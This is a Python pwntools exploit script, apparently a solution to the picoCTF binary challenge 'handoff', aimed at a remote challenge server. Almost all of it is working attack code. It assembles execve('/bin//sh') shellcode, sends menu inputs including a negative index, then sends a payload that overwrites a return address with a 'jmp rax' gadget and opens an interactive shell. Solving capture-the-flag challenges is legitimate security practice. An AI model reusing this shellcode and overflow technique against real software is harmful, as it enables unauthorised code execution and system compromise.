#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template handoff
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'handoff')
context.log_level = 'debug'
context.terminal = ['wt.exe','wsl.exe'] 
# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOT:
    	return remote("shape-facility.picoctf.net",51822)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Partial RELRO
# Stack:      No canary found
# NX:         NX unknown - GNU_STACK missing
# PIE:        No PIE (0x400000)
# Stack:      Executable
# RWX:        Has RWX segments
# SHSTK:      Enabled
# IBT:        Enabled
# Stripped:   No

p = start()

jmp_rax_addr = 0x40116c
shellcode = asm("""
    xor rsi, rsi
    xor rdx, rdx

    push rsi                     
    mov rdi, 0x68732f2f6e69622f  
    push rdi
    mov rdi, rsp                
    
    xor rax, rax                  
    mov al, 59                   
    syscall
""")

print(len(shellcode))
p.sendline(b'2')
p.sendline(b'-1')
payload = flat(shellcode.ljust(40,b'\x00'),jmp_rax_addr)
p.sendline(payload)

p.interactive()

